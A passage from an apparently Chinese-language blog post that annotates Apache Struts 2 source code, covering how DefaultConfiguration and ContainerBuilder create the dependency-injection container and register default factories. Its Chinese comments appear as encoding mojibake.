ignore</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (ObjectFactory.class != type) &#123;</span><br><span class="line">                            builder.factory(type, <span class="keyword">new</span> <span class="title class_">ObjectFactoryDelegateFactory</span>(foundName, type), scope);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Cannot locate the chosen ObjectFactory implementation: &quot;</span> + foundName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            LOG.warn(<span class="string">&quot;Unable to alias bean type (&#123;&#125;), default mapping already assigned.&quot;</span>, type.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="åˆå§‹åŒ–é¢„åŠ è½½é…ç½®å¯¹è±¡ï¼ˆåˆ›å»ºå®¹å™¨ï¼‰"><a href="#åˆå§‹åŒ–é¢„åŠ è½½é…ç½®å¯¹è±¡ï¼ˆåˆ›å»ºå®¹å™¨ï¼‰" class="headerlink" title="åˆå§‹åŒ–é¢„åŠ è½½é…ç½®å¯¹è±¡ï¼ˆåˆ›å»ºå®¹å™¨ï¼‰"></a>åˆå§‹åŒ–é¢„åŠ è½½é…ç½®å¯¹è±¡ï¼ˆåˆ›å»ºå®¹å™¨ï¼‰</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.inject.Inject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Container <span class="title function_">getContainer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ContainerHolder.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ContainerHolder.get();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å®¹å™¨ç®¡ç†å™¨ä¹‹å‰å·²ç»æœ‰åˆ›å»ºäº†</span></span><br><span class="line">    <span class="type">ConfigurationManager</span> <span class="variable">mgr</span> <span class="operator">=</span> getConfigurationManager();</span><br><span class="line">    <span class="keyword">if</span> (mgr == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The configuration manager shouldn&#x27;t be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Configuration å¯¹è±¡ä¹‹å‰æ²¡æœ‰åˆ›å»º  è¿™é‡Œä¼šåˆ›å»º  </span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> mgr.getConfiguration();</span><br><span class="line">        <span class="keyword">if</span> (config == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to load configuration&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> config.getContainer();</span><br><span class="line">            ContainerHolder.store(container);</span><br><span class="line">            <span class="keyword">return</span> container;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Configuration <span class="title function_">getConfiguration</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (configuration == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»º DefaultConfiguration å¯¹è±¡ å¹¶è®¾ç½®åˆ°å±æ€§ä¸­</span></span><br><span class="line">        setConfiguration(createConfiguration(defaultFrameworkBeanName));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åŠ è½½å®¹å™¨   ContainerProviders å°±æ˜¯ä¹‹æ°”é‚£é‚£ä¸€äº›åˆ—çš„initæ–¹æ³•ä¸­è®¾ç½®çš„é‚£äº›</span></span><br><span class="line">            configuration.reloadContainer(getContainerProviders());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigurationException e) &#123;</span><br><span class="line">            setConfiguration(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to load configuration.&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        conditionalReload();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> configuration;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> List&lt;PackageProvider&gt; <span class="title function_">reloadContainer</span><span class="params">(List&lt;ContainerProvider&gt; providers)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">    packageContexts.clear();</span><br><span class="line">    loadedFileNames.clear();</span><br><span class="line">    List&lt;PackageProvider&gt; packageProviders = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// è¿™ä¸ªå‚æ•°å°±æ˜¯ä¼ å…¥åˆ°  containerProvider çš„ registeræ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°  </span></span><br><span class="line">    <span class="comment">// æ‰€ä»¥åœ¨registeræ–¹æ³•è°ƒç”¨å®Œæ¯•å propsä¸­å­˜çš„å°±æ˜¯strutsçš„æ‰€æœ‰é…ç½®å±æ€§</span></span><br><span class="line">    <span class="type">ContainerProperties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContainerProperties</span>();</span><br><span class="line">    <span class="comment">// å®¹å™¨çš„æ„å»ºå™¨ è¿™ä¸ªå®¹å™¨çš„æ„å»ºå™¨å±äºç”¨æˆ·ï¼ŒåŒ…å«ç”¨æˆ·æ³¨å…¥çš„beanç­‰</span></span><br><span class="line">    <span class="type">ContainerBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContainerBuilder</span>();</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ ¹å®¹å™¨ è·Ÿå®¹å™¨ä¸­ä¸»è¦åŒ…å«çš„æ—¶ç³»ç»Ÿçš„æ ‡å‡†å¯¹è±¡</span></span><br><span class="line">    <span class="type">Container</span> <span class="variable">bootstrap</span> <span class="operator">=</span> createBootstrapContainer(providers);</span><br><span class="line">    <span class="comment">// éå†provider</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">final</span> ContainerProvider containerProvider : providers) &#123;</span><br><span class="line">        <span class="comment">// å®¹å™¨æ³¨å…¥  ä¸ºprovideræ³¨å…¥å­—æ®µ  é€šè¿‡injectæ ‡ç­¾æ³¨å…¥</span></span><br><span class="line">        bootstrap.inject(containerProvider);</span><br><span class="line">        <span class="comment">// è°ƒç”¨å®¹å™¨providerçš„initæ–¹æ³•</span></span><br><span class="line">        containerProvider.init(<span class="built_in">this</span>);</span><br><span class="line">        <span class="comment">// è°ƒç”¨registeræ–¹æ³•</span></span><br><span class="line">        containerProvider.register(builder, props);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å°†providerè®¾ç½®çš„å±æ€§ è½¬æ¢ä¸ºstringç±»å‹çš„beanæ³¨å…¥åˆ°å®¹å™¨ä¸­</span></span><br><span class="line">    props.setConstants(builder);</span><br><span class="line"></span><br><span class="line">    builder.factory(Configuration.class, <span class="keyword">new</span> <span class="title class_">Factory</span>&lt;Configuration&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Configuration <span class="title function_">create</span><span class="params">(Context context)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">return</span> DefaultConfiguration.<span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Configuration</span>&gt; type() &#123;</span><br><span class="line">            <span class="keyword">return</span> DefaultConfiguration.<span class="built_in">this</span>.getClass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// åˆ›å»ºactionContext æœ€å¼€å§‹åº”è¯¥ä¸ºç©º</span></span><br><span class="line">    <span class="type">ActionContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> ActionContext.getContext();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Set the bootstrap container for the purposes of factory creation</span></span><br><span class="line">        <span class="comment">// åˆ›å»º ActionContext åŒ…æ‹¬ å€¼æ ˆçš„åˆ›å»º</span></span><br><span class="line">        setContext(bootstrap);</span><br><span class="line">        <span class="comment">// åˆ›å»º ç”¨æˆ·å®¹å™¨  ä¸åŠ è½½å•ä¾‹å¯¹è±¡</span></span><br><span class="line">        container = builder.create(<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// è¿™é‡Œå•¥ä¹Ÿä¸ä¼šåš  ä¹‹å‰å·²ç»åˆ›å»ºäº†ActionContextäº†  ä¸ä¼šå†é‡å¤åˆ›å»º</span></span><br><span class="line">        <span class="comment">// è¿™ä¸€æ­¥åº”è¯¥æ˜¯ä¸ºäº†é¿å…å‰é¢ bootStrap å®¹å™¨ ä¸­æ²¡æœ‰åŠ è½½çš„æœ‰å€¼æ ˆå¯¹è±¡å·¥å‚çš„æƒ…å†µ</span></span><br><span class="line">        <span class="comment">// ä½†æ˜¯è¿™ç§æƒ…å†µçœŸçš„ä¼šå‡ºç°å—</span></span><br><span class="line">        setContext(container);</span><br><span class="line">        <span class="comment">// è·å–  ObjectFactory çš„beanå®ä¾‹</span></span><br><span class="line">        objectFactory = container.getInstance(ObjectFactory.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process the configuration providers first</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> ContainerProvider containerProvider : providers) &#123;</span><br><span class="line">            <span class="comment">// å¯¹PackageProviderè¿›è¡Œç‰¹æ®Šå¤„ç†</span></span><br><span class="line">        <span class="comment">// æ‰€æœ‰çš„ConfigurationProviderçš„å­ç±»éƒ½æ˜¯ packageProvider</span></span><br><span class="line">        <span class="comment">// åŒ…æ‹¬ struts.xmlç­‰æ–‡ä»¶å¯¹åº”çš„provider</span></span><br><span class="line">            <span class="keyword">if</span> (containerProvider <span class="keyword">instanceof</span> PackageProvider) &#123;</span><br><span class="line">                <span class="comment">// å‰é¢å·²ç»æ³¨å…¥è¿‡ä¾æ¬¡äº†  è¿™é‡Œå†æ¬¡æ³¨å…¥æ„ä¹‰ä½•åœ¨</span></span><br><span class="line">                container.inject(containerProvider);</span><br><span class="line">                <span class="comment">// è°ƒç”¨loadPackagesæ–¹æ³•</span></span><br><span class="line">                <span class="comment">// å…¶å®å°±æ˜¯å¤„ç† struts.xmlç­‰æ–‡ä»¶å¯¹åº”çš„ packageæ ‡ç­¾  </span></span><br><span class="line">                <span class="comment">// å³ä¸actionæœ‰å…³</span></span><br><span class="line">                ((PackageProvider) containerProvider).loadPackages();</span><br><span class="line">                packageProviders.add((PackageProvider) containerProvider);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Then process any package providers from the plugins</span></span><br><span class="line">        <span class="comment">// ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ packageProvider </span></span><br><span class="line">        Set&lt;String&gt; packageProviderNames = container.getInstanceNames(PackageProvider.class);</span><br><span class="line">        <span class="keyword">for</span> (String name : packageProviderNames) &#123;</span><br><span class="line">            <span class="type">PackageProvider</span> <span class="variable">provider</span> <span class="operator">=</span> container.getInstance(PackageProvider.class, name);</span><br><span class="line">            provider.init(<span class="built_in">this</span>);</span><br><span class="line">            provider.loadPackages();</span><br><span class="line">            packageProviders.add(provider);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// é‡æ„è¿è¡Œæ—¶é…ç½® ä¸»è¦æ˜¯å¯¹æ¯ä¸ªActionçš„é…ç½®è¿›è¡Œè¡¥å……ï¼Œ å¦‚æœä¸€äº›å…³é”®é…ç½®ç¼ºçœçš„è¯ä»çˆ¶åŒ…çš„é…ç½®ä¸­è·å–é»˜è®¤çš„é…ç½®</span></span><br><span class="line">        <span class="comment">// å¦‚ result ä»¥åŠæ‹¦æˆªå™¨çš„é…ç½®</span></span><br><span class="line">        rebuildRuntimeConfiguration();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (oldContext == <span class="literal">null</span>) &#123;</span><br><span class="line">            ActionContext.setContext(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> packageProviders;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Container <span class="title function_">createBootstrapContainer</span><span class="params">(List&lt;ContainerProvider&gt; providers)</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºå®¹å™¨builder </span></span><br><span class="line">    <span class="comment">// æ„é€ æ–¹æ³•é‡Œä¸»è¦åˆ›ä»·äº†ä¸¤ä¸ª factories å³ CONTAINER_FACTORY ä»¥åŠ LOGGER_FACTORY</span></span><br><span class="line">    <span class="type">ContainerBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContainerBuilder</span>();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">fmFactoryRegistered</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// éå†containerProvider</span></span><br><span class="line">    <span class="keyword">for</span> (ContainerProvider provider : providers) &#123;</span><br><span class="line">        <span class="keyword">if</span> (provider <span class="keyword">instanceof</span> FileManagerProvider) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨fileManagerProviderçš„registeræ³¨å…¥æ–‡ä»¶ç®¡ç†å™¨</span></span><br><span class="line">            <span class="comment">// æ–‡ä»¶ç®¡ç†å™¨åé¢è¿˜ä¼šè¢«æ³¨å…¥ä¸€æ¬¡ ä½†æ˜¯å› ä¸ºå…¶æ˜¯å•ä¾‹çš„æ‰€ä»¥æ²¡å•¥å½±å“</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œæå‰æ³¨å…¥æ˜¯å› ä¸ºåé¢æœ‰äº›providerçš„registeræ–¹æ³•ä¼šä½¿ç”¨åˆ°filemanagerå–è®¿é—®æ–‡ä»¶1</span></span><br><span class="line">            provider.register(builder, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (provider <span class="keyword">instanceof</span> FileManagerFactoryProvider) &#123;</span><br><span class="line">            <span class="comment">// åŒä¸Š</span></span><br><span class="line">            provider.register(builder, <span class="literal">null</span>);</span><br><span class="line">            fmFactoryRegistered = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ³¨å…¥æ ‡å‡†å¯¹è±¡</span></span><br><span class="line">    builder.factory(ObjectFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ActionFactory.class, DefaultActionFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ResultFactory.class, DefaultResultFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(InterceptorFactory.class, DefaultInterceptorFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(com.opensymphony.xwork2.factory.ValidatorFactory.class, com.opensymphony.xwork2.factory.DefaultValidatorFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ConverterFactory.class, DefaultConverterFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(UnknownHandlerFactory.class, DefaultUnknownHandlerFactory.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(FileManager.class, <span class="string">&quot;system&quot;</span>, DefaultFileManager.class, Scope.SINGLETON);</span><br><span class="line">    <span class="keyword">if</span> (!fmFactoryRegistered) &#123;</span><br><span class="line">        builder.factory(FileManagerFactory.class, DefaultFileManagerFactory.class, Scope.SINGLETON);</span><br><span class="line">    &#125;</span><br><span class="line">    builder.factory(ReflectionProvider.class, OgnlReflectionProvider.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ValueStackFactory.class, OgnlValueStackFactory.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(XWorkConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ConversionPropertiesProcessor.class, DefaultConversionPropertiesProcessor.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ConversionFileProcessor.class, DefaultConversionFileProcessor.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ConversionAnnotationProcessor.class, DefaultConversionAnnotationProcessor.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverterCreator.class, DefaultTypeConverterCreator.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverterHolder.class, DefaultTypeConverterHolder.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(XWorkBasicConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.COLLECTION_CONVERTER, CollectionConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.ARRAY_CONVERTER, ArrayConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.DATE_CONVERTER, DateConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.NUMBER_CONVERTER, NumberConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.STRING_CONVERTER, StringConverter.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(TextProvider.class, <span class="string">&quot;system&quot;</span>, DefaultTextProvider.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(LocalizedTextProvider.class, StrutsLocalizedTextProvider.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TextProviderFactory.class, StrutsTextProviderFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(LocaleProviderFactory.class, DefaultLocaleProviderFactory.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(TextParser.class, OgnlTextParser.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(ObjectTypeDeterminer.class, DefaultObjectTypeDeterminer.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(PropertyAccessor.class, CompoundRoot.class.getName(), CompoundRootAccessor.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(OgnlUtil.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(ValueSubstitutor.class, EnvsValueSubstitutor.class, Scope.SINGLETON);</span><br><span class="line">    <span class="comment">// å¸¸é‡æ˜¯ä¸€ä¸ª prototypeç±»å‹çš„ Stringç±»å‹çš„bean æ¯ä¸€æ¬¡è®¿é—®éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„bean</span></span><br><span class="line">    builder.constant(XWorkConstants.DEV_MODE, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(StrutsConstants.STRUTS_DEVMODE, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(XWorkConstants.LOG_MISSING_PROPERTIES, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(XWorkConstants.ENABLE_OGNL_EVAL_EXPRESSION, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(XWorkConstants.ENABLE_OGNL_EXPRESSION_CACHE, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    builder.constant(XWorkConstants.RELOAD_XML_CONFIGURATION, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(StrutsConstants.STRUTS_I18N_RELOAD, <span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">    builder.constant(StrutsConstants.STRUTS_MATCHER_APPEND_NAMED_PARAMETERS, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="comment">// åˆ›å»ºcontainerå®ä¾‹</span></span><br><span class="line">    <span class="keyword">return</span> builder.create(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çœ‹çœ‹factoryæ–¹æ³•å…·ä½“å¹²äº†å•¥</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; ContainerBuilder <span class="title function_">factory</span><span class="params">(<span class="keyword">final</span> Class&lt;T&gt; type, <span class="keyword">final</span> String name,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> Class&lt;? extends T&gt; implementation, <span class="keyword">final</span> Scope scope)</span> &#123;</span><br><span class="line">    <span class="comment">// This factory creates new instances of the given implementation.</span></span><br><span class="line">    <span class="comment">// We have to lazy load the constructor because the Container</span></span><br><span class="line">    <span class="comment">// hasn&#x27;t been created yet.</span></span><br><span class="line">    InternalFactory&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; factory = <span class="keyword">new</span> <span class="title class_">InternalFactory</span>&lt;T&gt;() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">volatile</span> ContainerImpl.ConstructorInjector&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; constructor;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å½“è°ƒç”¨factoryçš„createçš„æ—¶å€™å°±ä¼šçœŸæ­£çš„åˆ›å»ºbeanå®ä¾‹</span></span><br><span class="line">        <span class="comment">// internalFacotryæ˜¯æœ€å†…å±‚çš„factoryï¼Œå¤–é¢è¿˜æœ‰å…¶ä»–çš„åŒ…è£…ç”¨çš„factoryç”¨æ¥å®Œæˆä¸åŒçš„åŠŸèƒ½</span></span><br><span class="line">        <span class="comment">// å¦‚scopeFactory ç”¨æ¥ç¡®å®šbeançš„ç”Ÿå‘½å‘¨æœŸ</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">create</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (constructor == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// è·å–beançš„æ„é€ å‡½æ•°</span></span><br><span class="line">                <span class="comment">// è¿™é‡Œé‡‡ç”¨äº†å•ä¾‹è®¾è®¡ å³åªè·å–ä¸€æ¬¡æ„é€ æ–¹æ³• é¿å…æ¯ä¸€æ¬¡åˆ›å»ºbeançš„æ—¶å€™éƒ½é‡å¤è·å–</span></span><br><span class="line">                <span class="built_in">this</span>.constructor =</span><br><span class="line">                        context.getContainerImpl().getConstructor(implementation);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// åˆ›å»ºå¯¹è±¡å®ä¾‹</span></span><br><span class="line">            <span class="keyword">return</span> (T) constructor.construct(context, type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; type() &#123;</span><br><span class="line">            <span class="keyword">return</span> implementation;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;() &#123;&#123;</span><br><span class="line">                put(<span class="string">&quot;type&quot;</span>, type);</span><br><span class="line">                put(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">                put(<span class="string">&quot;implementation&quot;</span>, implementation);</span><br><span class="line">                put(<span class="string">&quot;scope&quot;</span>, scope);</span><br><span class="line">            &#125;&#125;.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factory(Key.newInstance(type, name), factory, scope);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> &lt;T&gt; ContainerBuilder <span class="title function_">factory</span><span class="params">(<span class="keyword">final</span> Key&lt;T&gt; key,</span></span><br><span class="line"><span class="params">                                     InternalFactory&lt;? extends T&gt; factory, Scope scope)</span> &#123;</span><br><span class="line">    <span class="comment">// ç¡®è®¤å®¹å™¨æ˜¯å¦è¢«åˆ›å»º  æ²¡æœ‰è¢«åˆ›å»ºæ‰èƒ½ç»§ç»­æ‰§è¡Œ</span></span><br><span class="line">    ensureNotCreated();</span><br><span class="line">    <span class="comment">// æ£€æŸ¥å®¹å™¨ä¸­æ˜¯å¦å·²ç»è¢«æ³¨å…¥äº† åŒåçš„bean  type+name</span></span><br><span class="line">    checkKey(key);</span><br><span class="line">    <span class="comment">// åˆ›å»ºbeanç”Ÿå‘½å‘¨æœŸå·¥å‚  ä¸åŒçš„ç”Ÿå‘½å‘¨æœŸå¾—åˆ°çš„å·¥å‚æ˜¯ä¸ä¸€æ ·çš„ å…·ä½“ä½“ç°åœ¨å…¶createæ–¹æ³•çš„å®ç°ä¸åŒä¸Š</span></span><br><span class="line">    <span class="comment">// å› ä¸ºä¸åŒä½œç”¨ä¸éœ€è¦ä½¿ç”¨ä¸åŒçš„å­˜å‚¨æ–¹æ¡ˆ å¦‚ threadå°±éœ€è¦ä½¿ç”¨threadLocalçš„å˜é‡ç±»å‹è¿›è¡Œå­˜å‚¨</span></span><br><span class="line">    <span class="keyword">final</span> InternalFactory&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; scopedFactory = scope.scopeFactory(key.getType(), key.getName(), factory);</span><br><span class="line">    <span class="comment">// æ‰€æœ‰çš„ factory éƒ½ä¿å­˜åœ¨factoriesä¸­</span></span><br><span class="line">    factories.put(key, scopedFactory);</span><br><span class="line">    <span class="comment">// å¯¹scopefactoryæ›´è¿›ä¸€æ­¥çš„åŒ…è£…  </span></span><br><span class="line">    <span class="comment">// ä¸»è¦è®¾è®¡ ExternalContext çš„è®¾ç½®</span></span><br><span class="line">    <span class="comment">// è¿™ä¸ªç±»ä¸»è¦è®¾è®¡äº† ExternalContext çš„è®¾ç½® åªæœ‰ å•ä¾‹ä»¥åŠ  EarlyInitializableç±»å‹çš„beanæ‰è¢«ä½¿ç”¨</span></span><br><span class="line">    <span class="comment">// é‚£ä¹ˆå¯¹äºå…¶ä»–ç±»å‹çš„beanæ¥è¯´å²‚ä¸å°±æ˜¯æ— ç”¨çš„ï¼Œé‚£ä¹ˆå°±å­˜åœ¨ä¸€ä¸ªè‡ªé€‰æ¶ˆè€—çš„é—®é¢˜ï¼Œé‚£ä¹ˆæ˜¯å¦åº”è¯¥æŠŠä¸€æ­¥æ”¾åˆ°ifé‡Œé¢å»ã€‚  </span></span><br><span class="line">    <span class="comment">// è¿™ä¸æä¸ªprå—ï¼Ÿï¼Ÿï¼Ÿ </span></span><br><span class="line">    InternalFactory&lt;T&gt; callableFactory = createCallableFactory(key, scopedFactory);</span><br><span class="line">    <span class="comment">// åˆ¤æ–­factorçš„ç±»å‹  å³beanæ ‡ç­¾çš„typeå±æ€§æŒ‡å®šçš„å€¼</span></span><br><span class="line">    <span class="comment">// æŒ‡ç¤ºè¿™äº›beanéœ€è¦æå‰è¿›è¡Œè£…é…  </span></span><br><span class="line">    <span class="keyword">if</span> (EarlyInitializable.class.isAssignableFrom(factory.type())) &#123;</span><br><span class="line">        earlyInitializableFactories.add(callableFactory);</span><br><span class="line">        <span class="comment">// å•ä¾‹ç±»å‹çš„beanä¹Ÿéœ€è¦å•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scope == Scope.SINGLETON) &#123;</span><br><span class="line">        singletonFactories.add(callableFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºå®¹å™¨å®ä¾‹</span></span><br><span class="line"><span class="keyword">public</span> Container <span class="title function_">create</span><span class="params">(<span class="type">boolean</span> loadSingletons)</span> &#123;</span><br><span class="line">    <span class="comment">// ç¡®ä¿å®¹å™¨æ²¡æœ‰è¢«åˆ›å»º</span></span><br><span class="line">    ensureNotCreated();</span><br><span class="line">    created = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// æ–°å»ºä¸€ä¸ª ContainerImpl å®ä¾‹å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// // å°† åˆ›å»ºä» type åˆ° bean nameçš„ä¸å¯å˜æ˜ å°„å…³ç³» çº¿ç¨‹å®‰å…¨</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ContainerImpl</span> <span class="variable">container</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContainerImpl</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(factories));</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (loadSingletons) &#123;</span><br><span class="line">        container.callInContext(<span 